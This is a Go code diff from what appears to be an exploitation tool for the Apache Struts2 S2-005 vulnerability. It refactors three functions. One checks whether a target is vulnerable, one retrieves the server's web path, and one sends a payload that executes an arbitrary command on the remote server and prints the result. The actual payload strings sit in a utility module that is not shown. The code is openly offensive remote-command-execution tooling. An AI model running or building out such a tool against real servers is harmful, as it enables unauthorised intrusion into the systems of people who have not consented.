@@ -1,70 +1,29 @@
 package s005
 
 import (
-	"ST2G/cvemod/x51utils"
+	"ST2G/cvemod/utils"
 	"fmt"
-	"io/ioutil"
+	"github.com/fatih/color"
 	"log"
-	"net/http"
+	"net/url"
 	"strings"
-	"time"
 )
 
-func Check(url string){
-	var  buffer []byte
-	buffer = make([]byte, 512)
-	url+=x51utils.POC_s005_check
-	req, err := http.NewRequest("GET", url, nil)
-	req.Header.Add("Accept-Encoding", "gzip")
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		response,_:= client.Do(req)
-		response.Body.Read(buffer)
-		body = buffer
-	}
-	respBody := string(body)
-	isVulnable := strings.Contains(respBody, x51utils.Checkflag)
-	if isVulnable {
-		x51utils.Colorlog("Found Struts2-005!")
-
-	} else {
+func Check(targetUrl string){
+	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s005_check)
+	if utils.IfContainsStr(respString,utils.Checkflag){
+		color.Red("*Found Struts2-005！")
+	}else {
 		fmt.Println("Struts2-005 Not Vulnerable.")
 	}
 }
+func GetWebPath(targetUrl string){
+	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s005_webpath)
+	log.Println(respString)
+}
 
-func ExecCommand(url string,command string){
-	var  buffer []byte
-	buffer = make([]byte, 512)
-	url+=x51utils.POC_s005_exec(command)
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		response,_:= client.Do(req)
-		response.Body.Read(buffer)
-		body = buffer
-	}
-	respBody := string(body)
-	fmt.Println(respBody)
+func ExecCommand(targetUrl string,command string){
+	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s005_exec(command))
+	tmpResult := strings.Replace(url.QueryEscape(respString),"%00","",-1)
+	fmt.Println(url.QueryUnescape(tmpResult))
 }
